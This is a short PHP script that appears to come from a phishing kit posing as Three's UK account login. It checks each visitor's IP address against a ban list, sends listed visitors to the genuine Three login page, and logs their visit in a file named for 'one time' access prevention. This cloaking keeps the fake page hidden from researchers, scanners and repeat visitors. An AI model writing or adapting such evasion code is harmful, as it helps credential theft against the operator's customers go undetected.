<?php


$filename = 'includes/ipbanned.txt';
$ip_to_search = $_SERVER[REMOTE_ADDR];

if (false !== strpos(file_get_contents($filename), $ip_to_search)){
 
     header("Location: https://new.three.co.uk/account/login");
     $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
     file_put_contents('includes/one_time_br_prevents.log', $line . PHP_EOL, FILE_APPEND);
     
}
else {
     // otherwise
}





?>